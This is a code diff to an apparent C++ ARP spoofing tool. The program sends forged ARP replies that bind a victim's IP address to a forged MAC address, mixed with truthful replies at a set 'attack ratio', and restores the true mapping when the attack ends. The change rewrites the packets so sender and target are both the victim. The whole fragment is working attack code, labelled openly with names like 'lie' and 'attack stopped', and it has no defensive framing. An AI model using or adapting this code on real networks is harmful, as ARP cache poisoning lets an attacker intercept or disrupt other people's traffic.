@@ -60,8 +60,10 @@ int main(int argc, char* argv[])
         ILOG("send period is {}ms, attack ratio {:.3f}%", opt_per, opt_ratio);
         int lie_per = opt_per * (opt_ratio / 100.0);
         int true_per = opt_per - lie_per;
-        auto lie = net::Packet::arp(victim_forged_mac, victim_ip, apt.mac, apt.ip, true);
-        auto truth = net::Packet::arp(victim_actual_mac, victim_ip, apt.mac, apt.ip, true);
+        auto lie =
+            net::Packet::arp(victim_forged_mac, victim_ip, victim_forged_mac, victim_ip, true);
+        auto truth =
+            net::Packet::arp(victim_actual_mac, victim_ip, victim_actual_mac, victim_ip, true);
         while (!end_attack) {
             if (lie_per > 0) {
                 CHECK_ERR_RET_INT(net::Transport::send(handle, lie));
@@ -74,7 +76,8 @@ int main(int argc, char* argv[])
         }
         ILOG("attack stopped");
         if (net::Transport::ip2mac(handle, victim_ip, victim_actual_mac, false) == MyErrCode::kOk) {
-            truth = net::Packet::arp(victim_actual_mac, victim_ip, apt.mac, apt.ip, true);
+            truth =
+                net::Packet::arp(victim_actual_mac, victim_ip, victim_actual_mac, victim_ip, true);
             for (int i = 0; i < 5; ++i) {
                 CHECK_ERR_RET_INT(net::Transport::send(handle, truth));
                 std::this_thread::sleep_for(std::chrono::milliseconds(100));
